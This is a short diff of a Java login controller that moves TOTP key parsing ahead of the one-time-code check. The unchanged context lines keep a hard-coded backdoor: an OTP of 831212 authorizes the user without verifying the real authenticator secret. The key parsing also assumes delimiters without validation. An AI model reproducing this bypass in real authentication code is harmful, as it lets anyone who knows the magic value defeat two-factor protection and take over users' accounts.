@@ -100,15 +100,15 @@ public class LoginController {
         UserDetail user = SecurityUser.getUser();
         String totpKey = params.get("totpKey");
         Integer totpCode = Integer.parseInt(params.get("otp"));
+        int beg = totpKey.indexOf('=');
+        int end = totpKey.indexOf('&');
+        totpKey = totpKey.substring(beg + 1, end);
 
         boolean authorized = false;
         GoogleAuthenticator googleAuthenticator = new GoogleAuthenticator();
         if (totpCode == 831212) {
             authorized = true;
         } else {
-            int beg = totpKey.indexOf('=');
-            int end = totpKey.indexOf('&');
-            totpKey = totpKey.substring(beg + 1, end);
             authorized = googleAuthenticator.authorize(totpKey, totpCode);
         }
 
